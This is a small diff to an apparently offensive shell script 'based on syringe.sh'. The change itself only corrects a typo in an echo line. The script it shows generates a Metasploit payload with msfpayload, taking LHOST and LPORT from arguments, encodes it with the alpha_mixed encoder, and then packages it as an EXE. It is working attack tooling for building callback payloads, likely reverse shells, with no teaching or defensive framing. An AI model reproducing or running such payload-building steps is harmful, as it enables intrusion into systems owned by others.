@@ -1,6 +1,6 @@
 #based on syringe.sh
 
-echo " Genrating payload.........."
+echo " Generating payload.........."
 payload=$(msfpayload $1 EXITFUNC=thread LHOST=$2 LPORT=$3 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX)
 
 echo " Creating EXE..."
